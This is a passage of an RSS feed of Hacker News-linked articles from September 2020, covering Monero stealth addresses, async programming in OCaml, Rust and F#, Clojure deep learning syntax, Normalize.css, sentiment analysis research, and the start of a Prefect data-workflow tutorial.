src="https://serhack.me/images/stealthaddress/1_bitcoin_800px.png" alt="Bitcoin Transparent Ledger"></p><p>Thanks to Ring Signatures and RingCT, your privacy as the sender is protected and the transaction amount is unknown. To further prevent any potential transaction analysis and, more importantly, to ensure the privacy of the recipient (or, simply put, how and where you spend your funds), Monero uses Stealth Addresses.</p><p><img src="https://serhack.me/images/stealthaddress/2_monero_800px.png" alt="Hidden connection between Stealth Address and Wallet"></p><p>A Stealth Address is an automatically generated, one-time public key (otherwise known as a random, one-time address) that is created by the sender, on behalf of the recipient, when a transaction on the Monero network is initiated ― think of this as a <strong>“burning address”</strong>. This one-time public key is recorded as part of each transaction and designates who can spend an output in a future transaction. While observing the blockchain, third parties (such as a government or a company that performs in-depth transaction analysis) are not able to link your wallet address and the merchant’s wallet address; therefore, it is not possible to tell if Monero is being sent from you to the merchant. Through the use of Stealth Addresses, when you send Monero to a merchant, the output received by the merchant is not publicly associated with the merchant’s wallet address. If you are in a position where you need proof that you sent Monero to the merchant, your wallet will be able to verify that the transaction was indeed sent. In addition, Stealth Addresses ensure that the merchant can always know that a third-party will not be able to see if or when any Monero has been sent and received. This unique feature of a Monero transaction is especially attractive to merchants, because it serves as a way to protect sensitive financial and operational information.</p><p>To better understand the concept of Stealth Addresses, let’s consider an example where you send a parcel to your friend via the postal system ― where every movement of the parcel, from sender to recipient, is tracked. At the beginning of this exchange, your friend tells you the home address. From there, you bring the parcel to the post office and send it along to your friend’s home address that was provided. During the course of this transfer, via the tracking code that was provided by the postal system, you can see the movement of the parcel between you and your friend, including your friend’s home addresses. This is analogous to Bitcoin ― where every movement of the transaction, from sender to recipient, is traceable. However, if you told your friend to use a temporary post box, no one would associate the movement of the parcel to your friend, since finding the owner of a temporary box is difficult.</p><p>How are these one-time addresses generated? Your Monero wallet’s public address is a 95-character string, which incorporates two public keys (public view key and public send key) that are mathematically derived from your seed. When a customer sends Monero to a merchant, the customer will use the public keys in the merchant’s address along with some random data to generate a unique one-time public key for the merchant’s new output. While observers of the blockchain can see the one-time public key, the customer and the merchant are the only parties who definitively know that, in fact, the customer sent the Monero to the merchant. While the merchant’s wallet is scanning or syncing, the wallet’s private view key is being used to check all transactions and accompanying outputs on the blockchain in an effort to locate the output destined for its wallet. Once the output is detected and received by the merchant’s wallet, the merchant is now able to calculate a one-time private key that corresponds with the one-time public key and, if the merchant chooses, spend the relevant output with the wallet’s private spend key. Thanks to Stealth Addresses, this transaction process occurs without publicly linking any transaction to the merchant’s wallet address.</p><p><img src="https://serhack.me/images/stealthaddress/3_burn_800px.png" alt="One stealth address and one payment"></p><p>Simply put, a Stealth Address is a powerful cryptographic technique that prevents outputs from being linked to a recipient’s public address. As described above, this is accomplished through the use of one-time public keys. Only the recipient has the ability to identify their designated output while scanning the blockchain and, once received, the output can only be spent by the recipient. Seeing that outputs are unlinkable, the recipient’s privacy is secured.</p><p>While the concept of Stealth Addresses can seem quite technical to some, one of the user-friendly features of this technology is that the sender and recipient do not need to take any further steps outside the normal process of performing a transaction, because Stealth Addresses are implemented by default. Despite being a key feature of a Monero transaction, and through being implemented by default, Stealth Addresses can fly under the radar and be considered just another cog in the well-oiled machine.</p><p>A commonly asked question is: “But if they’re randomly generated, is it possible a collision could occur?” Luigi1111, collaborator and member of the Monero Core Team, gives us an estimate. Using the birthday paradox for the calculation, it would take about 2^126 Stealth Addresses generated to have a 50% collision occur. You would need 85,070,591,730,234,615,865,843,651,857,942,052,864 transactions, when at the time of writing, the transactions within the Monero network are approximately 8 million. For comparison, there are far fewer grains of sand in the world than the number of transactions that would be needed for such a collision. This is an impressive number that confirms the security of this powerful cryptographic technique.</p><p><img src="https://serhack.me/images/stealthaddress/4_birthdays_800px.png" alt="Many stealth addresses are linked to wallet"></p><p>Lastly, an important point to make is what Stealth Addresses are not. With payment systems that accept Bitcoin or Ethereum, you might find a different payment address that is generated randomly. This is not a Stealth Address, because at the blockchain level, analysis and tracking tools would be able to find a link between the two different addresses, along with what these addresses have received and sent.</p></div></div>]]>
            </description>
            <link>https://serhack.me/articles/what-is-stealth-address-technology-monero/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24509865</guid>
            <pubDate>Thu, 17 Sep 2020 20:57:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adventures in Async]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24509435">thread link</a>) | @steveklabnik
<br/>
September 17, 2020 | https://blog.darklang.com/adventures-in-async/ | <a href="https://web.archive.org/web/*/https://blog.darklang.com/adventures-in-async/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.darklang.com/content/images/size/w300/2020/09/cri_000000386470-1.jpg 300w,
                            https://blog.darklang.com/content/images/size/w600/2020/09/cri_000000386470-1.jpg 600w,
                            https://blog.darklang.com/content/images/size/w1000/2020/09/cri_000000386470-1.jpg 1000w,
                            https://blog.darklang.com/content/images/size/w2000/2020/09/cri_000000386470-1.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.darklang.com/content/images/size/w2000/2020/09/cri_000000386470-1.jpg" alt="Adventures in Async">
            </figure>

            <section>
                <div>
                    <p>I was very recently the holder of three opinions:</p><ul><li>Rust is magic fairy dust that can fix all my problems</li><li>Async is magic fairy dust that can fix all my problems</li><li>GraphQL is magic fairy dust that can fix all my problems</li></ul><p>Unsurprisingly, all of these appear to be wrong. This post is about the first two.</p><p>In the journey to get to product/market fit with Dark, I'm taking a slightly different strategy than we took before, which I'm calling "Hard Things First". Repeatedly with Dark we spent significant time coming up with hacks to work around previous hacks which themselves were working around previous hacks. That made for a codebase where people can only contribute is well-defined ways, as going outside the box was to invite madness. Or more specifically, to need to have the entire history of the codebase and company and roadmap in your head to understand why the code is like that.</p><p>So instead, I'm looking at doing the Hard Things First. Dark has a few problems in its server-side implementation, and those need to be fixed. We long speculated that we'd be able to hack them for now and do a Big Rewrite Later, with the copious resources that we'd have after the Series A. But alas, that is not how things are going, so I now need to figure out some of these Hard Things, and the first question is whether to stay in OCaml or switch to something else.</p><h2 id="staying-in-ocaml">Staying in OCaml</h2><p>If we stay in OCaml, I need to figure out how to solve a number of key problems, the biggest being how to not hang the server when making a slow <code>HTTPClient::get</code> request. The Dark web server is currently synchronous, and so long or slow requests--at sufficient volume--can cause operational issues for us. Solving that is something we aggressively put off; but the first of the Hard Things First to address. And that's where async comes in. </p><h3 id="quick-async-recap">Quick async recap</h3><p>As a quick introduction, the word <em>async</em> describes a way of allowing servers respond to many more requests by taking advantage of non-blocking IO. In the old days, servers used one thread to respond to each request. Now, servers commonly use an async implementation where a single thread can handle many many requests.</p><p>They do so by handling the requests in a simple loop. Each request is added to a queue when it comes in, and the request at the front of the queue is run by the thread. If the handler does some IO (perhaps talking to the DB or to a HTTP API), that thread will stop working on that request, and move onto the next request in the queue. When the IO finishes, it is re-added to the queue, where the thread will come for it shortly.</p><p>This is sort of like context switching between threads, but much lower overhead as you can switch between items in the queue much more cheaply than switching between threads. A single thread can handle dozens or hundreds of requests at once (so long as they are mostly IO-bound), so you can process many more requests than using simple multi-threading (and of course, you can still be multi-threaded in a multi-core situation, running an async server on each thread).</p><p><em>If you enjoyed that, you'll probably enjoy and learn a lot from <a href="https://techspot.zzzeek.org/2015/02/15/asynchronous-python-and-databases/">this post</a>.</em></p><h3 id="back-to-ocaml">Back to OCaml</h3><p>In OCaml, there's two competing async implementations, <a href="https://ocsigen.org/lwt/5.2.0/manual/manual">Lwt</a> and (the aptly named) <a href="https://opensource.janestreet.com/async/">Async</a>. The programming model isn't terrible since OCaml 4.08, when they added a <code>let*</code> keyword. This is roughly akin to the <code>await</code> keyword in <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await">JS</a>, <a href="https://docs.python.org/3/library/asyncio.html">Python</a> and <a href="https://rust-lang.github.io/async-book/01_getting_started/04_async_await_primer.html">Rust</a>. So you take your synchronous code:</p><pre><code>let sync_function () : int =
  6
  
let x = sync_function () in
x + 2</code></pre><p>and rewrite it asynchronously </p><pre><code>let async_function () : int Lwt.t =
  Lwt.return 6
  
let* x = async_function () in
Lwt.return (x + 2)</code></pre><p><code>Lwt.t</code> here is a promise, and it's the same concept as a Promise in JS, and <code>Async&lt;...&gt;</code> in Rust and F#.</p><p>The difference between the Lwt and Async libraries seems to be that Lwt is greedy (it will keep going on the same request if it can, that is, if the promise resolves fast enough) and Async is not (it will spread the work around if it can). So, roughly speaking, Lwt prioritizes latency and Async prioritizes fairness and preventing requests from being starved.</p><h3 id="other-ocaml-improvements">Other OCaml improvements</h3><p>Of course, the lack of async isn't the only problem in the Dark codebase. There are many things in our codebase that make it attractive to look at redoing the server-side implementation in another language.</p><p>However, having looked through the backend codebase recently, I think most of it can be solved by refactoring and using some of the tools that have come along in the last few years. In particular, <a href="https://github.com/paurkedal/ocaml-caqti">Caqti</a> &nbsp;solves some of the needs that are not solved by using <a href="https://github.com/mmottl/postgresql-ocaml">Postgresql-ocaml</a> directly (such as connection pooling). <a href="https://github.com/oxidizing/sihl">Slih</a> has come along to make it much nicer to write web services in OCaml. <a href="https://github.com/inhabitedtype/httpaf">httpaf</a> and <a href="https://github.com/anmonteiro/ocaml-h2">H2</a> look to solve some of the core performance problems in <a href="https://github.com/mirage/ocaml-cohttp">CoHttp</a>. And <a href="https://github.com/andreas/ocaml-graphql-server">OCaml-graphql-server</a> provides a nice graphql server in OCaml.</p><p>The other stuff that needs to be worked on to keep in OCaml is the tooling, but I think a lot of the problem comes from how we've mashed everything together, and a little bit of performance optimization in our build scripts might solve a lot of problems.</p><h2 id="rust-and-f-">Rust and F#</h2><p>I spent some time rewriting the core of Dark in Rust and <a href="https://fsharp.org/">F#</a>. Not the full thing, but just enough to connect a server to a Dark interpreter and calculate Fizzbuzz. The goal is to get a feel for the ecosystem, programming model, and of course the performance for asynchronous workloads like people build on Dark. Early learnings indicate that magical fairy dust does not exist.</p><p>The first learning, and I'll probably write some more about this later, is that coding in Rust is hard. Like, <a href="https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/">much harder than I expected</a>. And using async in Rust is exponentially harder than writing synchronous Rust, to the point that I'm not even sure that it's a good idea for anyone to do it (again, more on this in a future post). I had not realized how much the garbage collector does for you in managed languages, and how much complexity managing your own memory adds in an asynchronous server.</p><p>By contrast, rewriting the core of Dark in F# was very simple, and adapting it to use async was also extremely straightforward. This comes from someone who doesn't know anything about the dotnet ecosystem, but who does of course know OCaml, which is about 95% the same at F#.</p><p>The code is at <a href="https://github.com/darklang/sync-async-benchmarks">https://github.com/darklang/sync-async-benchmarks</a>, which I intend to turn into benchmarks. I hope they'll help inform my decision about which way to move forward. I've been learning a lot from the experiments with Rust and F#, and I've been using the experience to start working on a roadmap/spec for the next version of Dark, which I'll talk about soon.</p><p>As you can imagine, I'm eager to stop experimenting and make some decisions, and I'm looking forward to getting back to moving the Dark language and implementation forward.</p><hr><p><em><em>You can sign up for Dark <a href="https://darklang.com/signup">here</a>, and check out our progress in our <a href="https://darklang.com/slack-invite">contributor Slack</a> or by watching our <a href="https://github.com/darklang/dark">GitHub repo</a>.</em> Follow Dark (or <a href="https://twitter.com/darklang">me</a>) on <a href="https://twitter.com/darklang">Twitter</a>, or follow <a href="https://blog.darklang.com/rss/">the blog using RSS</a>.</em></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.darklang.com/adventures-in-async/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24509435</guid>
            <pubDate>Thu, 17 Sep 2020 20:16:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep Learning in Clojure with Fewer Parentheses Than Keras and Python]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24509374">thread link</a>) | @dragandj
<br/>
September 17, 2020 | https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras | <a href="https://web.archive.org/web/*/https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-org5455e07">
<p>
How about the number of dreaded parentheses, <code>(</code> and <code>)</code>?
</p>

<table>


<colgroup>
<col>

<col>

<col>
</colgroup>
<thead>
<tr>
<th scope="col">&nbsp;</th>
<th scope="col">Python</th>
<th scope="col">Clojure</th>
</tr>
</thead>
<tbody>
<tr>
<td>( and )</td>
<td>48</td>
<td>28</td>
</tr>

<tr>
<td>(, ), [, and ]</td>
<td>50</td>
<td>48</td>
</tr>

<tr>
<td>Grouped (())</td>
<td>8</td>
<td>2</td>
</tr>

<tr>
<td>)))</td>
<td>2</td>
<td>1</td>
</tr>

<tr>
<td>,</td>
<td>17</td>
<td>0</td>
</tr>

<tr>
<td>model.add</td>
<td>8</td>
<td>0</td>
</tr>
</tbody>
</table>

<p>
As we can see from the table, on every punctuation metric that I could think
of, Deep Diamond and Clojure fare better than Keras &amp; Python.
</p>

<p>
Keras uses almost twice as much parentheses than Deep Diamond. Clojure uses <code>[]</code>
for vector literals, which Deep Diamond uses as tensor shapes. You will note that
there are more than a few of these, and argue that these are parentheses, too.
Fine. Add them up, and Clojure fares slightly better than Python!
</p>

<p>
A parenthesis here and there is not a problem, but there are horror tales of
<code>(((((((</code> and <code>)))))))</code> in Lisps. Not in Clojure. See that there is not a
single <code>((</code> in the Clojure example, and only two occurances of <code>))</code>.
In Python - there are 8.
</p>

<p>
Then we come to all additional assorted punctuation in Python: commas, dots, etc.
In Clojure, there are none, while in Python there are dozens.
</p>

<p>
Python is also riddled with redundant stuff such as <code>model.add()</code>.
</p>

<p>
Etc., etc. You get my point.
</p>
</div></div>]]>
            </description>
            <link>https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras</link>
            <guid isPermaLink="false">hacker-news-small-sites-24509374</guid>
            <pubDate>Thu, 17 Sep 2020 20:11:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Normalize.css: A modern, HTML5-ready alternative to CSS resets]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24509235">thread link</a>) | @animationwill
<br/>
September 17, 2020 | http://necolas.github.io/normalize.css/ | <a href="https://web.archive.org/web/*/http://necolas.github.io/normalize.css/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          <p><img src="http://necolas.github.io/normalize.css/logo.svg" alt="Normalize.css"></p>
          <h2>A modern, HTML5-ready alternative to CSS resets</h2>
        </div>

        <p><a href="https://github.com/necolas/normalize.css/">Normalize.css</a> makes browsers render all elements more consistently and in line with modern standards. It precisely targets only the styles that need normalizing.</p>

        <div>
          <p><a href="https://necolas.github.io/normalize.css/8.0.1/normalize.css">
            <strong>Download</strong>
            <span>v8.0.1</span>
          </a></p><p>Chrome, Edge, Firefox ESR+, IE 10+, Safari 8+, Opera</p>
          <p><a href="https://github.com/necolas/normalize.css/blob/8.0.1/CHANGELOG.md">See the CHANGELOG</a>
        </p></div>

        <div>
          <pre><code><a href="https://www.npmjs.org/package/normalize.css/">npm</a> install normalize.css</code></pre>
        </div>

        
      </div></div>]]>
            </description>
            <link>http://necolas.github.io/normalize.css/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24509235</guid>
            <pubDate>Thu, 17 Sep 2020 19:59:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Algorithms discern our mood from what we write online]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24508610">thread link</a>) | @sinapticasblog
<br/>
September 17, 2020 | https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/ | <a href="https://web.archive.org/web/*/https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Researchers&nbsp;and companies are harnessing computers to identify the emotions behind our written words. While sentiment analysis is far from perfect, it manages to distill meaning from huge amounts of data — and could one day even monitor mental health.</p>



<p>By Dana Mackenzie</p>



<p>9.14.2020</p>



<p>Many people have declared 2020 the worst year ever. While such a description may seem hopelessly subjective, according to one measure, it’s true.</p>



<p>That yardstick is the Hedonometer, a computerized way of assessing both our happiness and our despair. It runs day in and day out on computers at the University of Vermont (UVM), where it scrapes some 50 million tweets per day off Twitter and then gives a quick-and-dirty read of the public’s mood. According to the Hedonometer, 2020 has been by far the most horrible year since it began keeping track in 2008.</p>



<p>The <a rel="noreferrer noopener" href="http://hedonometer.org/timeseries/en_all/" target="_blank">Hedonometer</a> is a relatively recent incarnation of a task computer scientists have been working on for more than 50 years: using computers to assess words’ emotional tone. To build the Hedonometer, UVM computer scientist Chris Danforth had to teach a machine to understand the emotions behind those tweets — no human could possibly read them all. This process, called sentiment analysis, has made major advances in recent years and is finding more and more uses.</p>



<div><figure><img loading="lazy" data-attachment-id="2008" data-permalink="https://sinapticas.com/g-hedonometer/" data-orig-file="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png" data-orig-size="1179,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="g-hedonometer" data-image-description="" data-medium-file="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=300" data-large-file="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=672" src="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=1024" alt="" width="720" height="366" srcset="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=1024 1024w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=720 720w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=150 150w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=300 300w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=768 768w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png 1179w" sizes="(max-width: 720px) 100vw, 720px"><figcaption>The Hedonometer tracks the sentiments expressed in tweets, an effort underway since late 2008. This screenshot shows data from mid-August 2019 to the present and reveals a record low in early March of this year coinciding with the Covid-19 pandemic going global; that record was shattered in May after George Floyd’s killing. Portion of scale shown at right goes from 1 (extremely negative) to 9 (extremely positive). Gray at bottom shows total volume of Twitter posts.<br>CREDIT: COMPUTATIONAL STORY LAB AT THE UNIVERSITY OF VERMONT</figcaption></figure></div>



<p>In addition to taking Twitter user’s emotional temperature, researchers are employing sentiment analysis to gauge people’s perceptions of climate change and to test conventional wisdom such as, in music, whether a minor chord is sadder than a major chord (and by how much). Businesses who covet information about customers’ feelings are harnessing sentiment analysis to assess reviews on platforms like Yelp. Some are using it to measure employees’ moods on the internal social networks at work. The technique might also have medical applications, such as identifying depressed people in need of help.</p>



<p>Sentiment analysis is allowing researchers to examine a deluge of data that was previously time-consuming and difficult to collect, let alone study, says Danforth. “In social science we tend to measure things that are easy, like gross domestic product. Happiness is an important thing that is hard to measure.”</p>



<h2>Deconstructing the ‘word stew’</h2>



<p>You might think the first step in sentiment analysis would be teaching the computer to understand what humans are saying. But that’s one thing that computer scientists cannot do; understanding language is one of the most notoriously difficult problems in artificial intelligence. Yet there are abundant clues to the emotions behind a written text, which computers can recognize even without understanding the meaning of the words.</p>



<p>The earliest approach to sentiment analysis is word-counting. The idea is simple enough: Count the number of positive words and subtract the number of negative words. An even better measure can be obtained by weighting words: “Excellent,” for example, conveys a stronger sentiment than “good.” These weights are typically assigned by human experts and are part of creating the word-to-emotion dictionaries, called lexicons, that sentiment analyses often use.</p>



<p>But word-counting has inherent problems. One is that it ignores word order, treating a sentence as a sort of word stew. And word-counting can miss context-specific cues. Consider this product review: “I’m so happy that my iPhone is nothing like my old ugly Droid.” The sentence has three negative words (“nothing,” “old,” “ugly”) and only one positive (“happy”). While a human recognizes immediately that “old” and “ugly” refer to a different phone, to the computer, it looks negative. And comparisons present additional difficulties: What does “nothing like” mean? Does it mean the speaker is <em>not</em> comparing the iPhone with the Android? The English language can be so confusing.</p>



<p>To address such issues, computer scientists have increasingly turned to more sophisticated approaches that take humans out of the loop entirely. They are using machine learning algorithms that teach a computer program to recognize patterns, such as meaningful relationships between words. For example, the computer can learn that pairs of words such as “bank” and “river” often occur together. These associations can give clues to meaning or to sentiment. If “bank” and “money” are in the same sentence, it is probably a different kind of bank.</p>



<div><figure><img data-attachment-id="2010" data-permalink="https://sinapticas.com/captura-de-pantalla-2020-09-17-a-las-15-44-31/" data-orig-file="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png" data-orig-size="577,396" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="captura-de-pantalla-2020-09-17-a-las-15.44.31" data-image-description="" data-medium-file="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=300" data-large-file="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=577" src="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=577" alt="" srcset="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png 577w, https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=150 150w, https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=300 300w" sizes="(max-width: 577px) 100vw, 577px"><figcaption>A computer using a shallow neural network can easily be trained for the task of next-word prediction — a familiar example is the suggested words featured while typing on a smartphone. Here, a neural network-trained language model calculates the probability that various words will follow “Thou shalt.” Once the network is fully trained, it can be reverse-engineered to generate the mathematical constructs called “word embeddings,” which link words that tend to go together. These, in turn, are used as an input to more difficult language-processing tasks, including sentiment analysis.</figcaption></figure></div>



<p>A major step in such methods came in 2013, when Tomas Mikolov of Google Brain applied machine learning to construct a tool called word embeddings. These convert each word into a list of 50 to 300 numbers, called a vector. The numbers are like a fingerprint that <a href="https://jalammar.github.io/illustrated-word2vec/" target="_blank" rel="noreferrer noopener">describes a word</a>, and particularly the other words it tends to hang out with.</p>



<p>To obtain these descriptors, Mikolov’s program looked at millions of words in newspaper articles and tried to predict the next word of text, given the previous words. Mikolov’s embeddings recognize synonyms: Words like “money” and “cash” have very similar vectors. More subtly, word embeddings capture elementary analogies — that king is to queen as boy is to girl, for example — even though it cannot define those words (a remarkable feat given that such analogies were part of how SAT exams assessed performance).</p>



<p>Mikolov’s word embeddings were generated by what’s called a neural network with one hidden layer. Neural networks, which are loosely modeled on the human brain, have <a href="https://www.knowablemagazine.org/article/technology/2020/why-some-artificial-intelligence-smart-until-its-dumb" target="_blank" rel="noreferrer noopener">enabled stunning advances in machine learning</a>, including AlphaGo (which learned to play the game of Go better than the world champion). Mikolov’s network was a deliberately shallower network, so it could be a useful for a variety of tasks, such as translation and topic analysis.</p>



<p><a href="https://www.knowablemagazine.org/article/technology/2020/synthetic-media-real-trouble-deepfakes" target="_blank" rel="noreferrer noopener">Deeper neural networks</a>, with more layers of “cortex,” can extract even more information about a word’s sentiment in the context of a particular sentence or document. A common reference task is for the computer to read a movie review on the Internet Movie Database and predict whether the reviewer gave it a thumbs up or thumbs down. The earliest lexicon methods achieved about 74 percent accuracy. The most sophisticated ones got up to 87 percent. The very first neural nets, in 2011, scored 89 percent. Today they perform with upwards of 94 percent accuracy — approaching that of a human. (Humor and sarcasm remain big stumbling blocks, because the written words may literally express the opposite of the intended sentiment.)</p>



<p><a href="https://www.knowablemagazine.org/collection/coronavirus-0" target="_blank" rel="noreferrer noopener">Explore&nbsp;<em>Knowable</em>’s coronavirus coverage</a></p>



<p>Despite the benefits of neural networks, lexicon-based methods are still popular; the Hedonometer, for instance, uses a lexicon, and Danforth has no intention to change it. While neural nets may be more accurate for some problems, they come at a cost. The training period alone is one of the most computationally intensive tasks you can ask a computer to do.</p>



<p>“Basically, you’re limited by how much electricity you have,” says the Wharton School’s Robert Stine, who covers the <a href="https://www.annualreviews.org/doi/10.1146/annurev-statistics-030718-105242" target="_blank" rel="noreferrer noopener">evolution of sentiment analysis</a> in the 2019 <em>Annual Review of Statistics and Its Application</em>. “How much electricity did Google use to train AlphaGo? The joke I heard was, enough to boil the ocean,” Stine says.</p>



<p>In addition to the electricity needs, neural nets require expensive hardware and technical expertise, and there’s a lack of transparency because the computer is figuring out how to tackle the task, rather than following a programmer’s explicit instructions. “It’s easier to fix errors with a lexicon,” says Bing Liu of the University of Illinois at Chicago, one of the pioneers of sentiment analysis.</p>



<h2>Measuring mental health</h2>



<p>While sentiment analysis often falls under the purview of computer scientists, it has <a href="https://www.cs.cmu.edu/~ylataus/files/TausczikPennebaker2010.pdf" target="_blank" rel="noreferrer noopener">deep roots in psychology</a>. In 1962, Harvard psychologist Philip Stone developed the General Inquirer, the first computerized general purpose text analysis program for use in psychology; in the 1990s, social psychologist James Pennebaker developed an early program for sentiment analysis (the Linguistic Inquiry and Word Count) as a view into people’s psychological worlds. These earlier assessments revealed and confirmed patterns that experts had long-observed: Patients diagnosed with depression had distinct <a href="https://journals.sagepub.com/doi/abs/10.1177/0261927x09351676" target="_blank" rel="noreferrer noopener">writing styles</a>, such as using pronouns “I” and “me” more often. They used more words with negative affect, and sometimes more death-related words.</p>



<p>Researchers are now probing mental health’s expression in speech and writing by <a rel="noreferrer noopener" href="https://www.annualreviews.org/doi/full/10.1146/annurev-biodatasci-030320-040844" target="_blank">analyzing social media posts</a>. Danforth and Harvard psychologist Andrew Reece, for example, analyzed the Twitter posts of people with formal diagnoses of depression or post-traumatic stress disorder that were written <em>prior</em> to the diagnosis (with consent of participants). <a rel="noreferrer noopener" href="https://www.nature.com/articles/s41598-017-12961-9" target="_blank">Signs of depression began to appear</a> as many as nine months earlier. And Facebook has an algorithm to detect users who seem to be at risk of suicide; human experts …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/">https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/</a></em></p>]]>
            </description>
            <link>https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24508610</guid>
            <pubDate>Thu, 17 Sep 2020 19:03:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Prefect – A modern, Python-native data workflow engine]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24507710">thread link</a>) | @gilad
<br/>
September 17, 2020 | https://makeitnew.io/prefect-a-modern-python-native-data-workflow-engine-7ece02ceb396 | <a href="https://web.archive.org/web/*/https://makeitnew.io/prefect-a-modern-python-native-data-workflow-engine-7ece02ceb396">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p id="c726">In the following example (<a href="https://github.com/ludwigm/prefect-demo-flow" rel="noopener">https://github.com/ludwigm/prefect-demo-flow</a>), I want to run you through how a potential Prefect flow may look like. This is a simplified example and in reality, you probably have more complex flows with more and bigger tasks. It should still give you the possibility to see what you can do with this tool. The example contains classical parts you see in many ETL flows consisting of different steps for Gathering of data (Extract), preparing and aggregation of data (Transform), and providing them somewhere as an output (Load).</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/776/1*xOynELMPA867ESFQw5Y33g.png" width="388" height="632" srcset="https://miro.medium.com/max/552/1*xOynELMPA867ESFQw5Y33g.png 276w, https://miro.medium.com/max/776/1*xOynELMPA867ESFQw5Y33g.png 388w" sizes="388px" data-old-src="https://miro.medium.com/max/36/1*xOynELMPA867ESFQw5Y33g.png?q=20"></p></div></div><figcaption>DAG of the flow created with flow.visualize()</figcaption></figure><p id="8e29">This example is taking daily world-wide <a href="https://data.europa.eu/euodp/en/data/dataset/covid-19-coronavirus-data/resource/ce379c1d-066a-4de8-a195-1d5e8338142a" rel="noopener">COVID data</a>, filters them by requested countries, aggregates them up on a monthly level, and finally uploads them as a human-readable CSV on AWS S3. On the left, you can see a DAG representation of the flow as it is created by Prefect.</p><p id="4d9f">The input data is in the following format provided as JSON files via an HTTP endpoint:</p><pre><span id="93a5">{<br>   "records" : [<br>      {<br>         "dateRep" : "07/09/2020",<br>         "day" : "07",<br>         "month" : "09",<br>         "year" : "2020",<br>         "cases" : 74,<br>         "deaths" : 2,<br>   